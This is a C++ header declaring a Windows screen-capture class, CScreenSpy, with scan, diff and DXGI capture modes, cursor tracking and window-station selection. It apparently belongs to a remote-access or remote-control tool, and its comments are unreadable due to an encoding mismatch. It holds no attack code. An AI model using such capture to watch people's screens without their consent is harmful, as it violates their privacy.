// ScreenSpy.h: interface for the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
#define AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_
#include <windows.h>
#include "CursorInfo.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// �����㷨
#define ALGORITHM_SCAN	1	// �ٶȺܿ죬����Ƭ̫��
#define ALGORITHM_DIFF	2	// �ٶȺ�����ҲռCPU������������������С��
#define ALGORITHM_DXGI	3	// WIN8DXGI
class CScreenSpy  
{
public:
	CScreenSpy(int biBitCount= 8, bool bIsGray= false, UINT nMaxFrameRate = 1000);
	virtual ~CScreenSpy();
	LPVOID getFirstScreen();
	LPVOID getNextScreen(LPDWORD lpdwBytes);

	void setAlgorithm(UINT nAlgorithm);
	LPBITMAPINFO getBI();
	UINT	getBISize();
	UINT	getFirstImageSize();
	void	setCaptureLayer(BOOL bIsCaptureLayer);
private:
	UINT m_bAlgorithm;
	UINT m_nMaxFrameRate;



	bool m_bIsGray;
	int m_nBinSize, m_nWidth, m_nHeight;




	DWORD m_dwBitBltRop;
	DWORD m_dwLastCapture;
	DWORD m_dwSleep;
	LPBYTE m_rectBuffer;
	
	UINT m_rectBufferOffset;
	BYTE m_nIncSize;
	int m_nFullWidth, m_nFullHeight, m_nStartLine;
	RECT m_changeRect;
	HDC m_hFullDC, m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
	HBITMAP m_hLineBitmap, m_hFullBitmap;
	LPVOID m_lpvLineBits, m_lpvFullBits;
	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
	int	m_biBitCount;
	int	m_nDataSizePerLine;

	LPVOID m_lpvDiffBits; // ����Ƚϵ���һ��
	HDC	m_hDiffDC, m_hDiffMemDC;
	HBITMAP	m_hDiffBitmap;

	CCursorInfo	m_CursorInfo;
	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // ����CPU
	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
	void WriteRectBuffer(LPBYTE	lpData, int nCount);
	bool ScanChangedRect(int nStartLine);
	void CopyRect(LPRECT lpRect);
	BOOL SelectInputWinStation();
	HWND m_hDeskTopWnd;
	void* m_hDxgi;

};

#endif // !defined(AFX_SCREENSPY_H__6600B30F_A7E3_49D4_9DE6_9C35E71CE3EE__INCLUDED_)
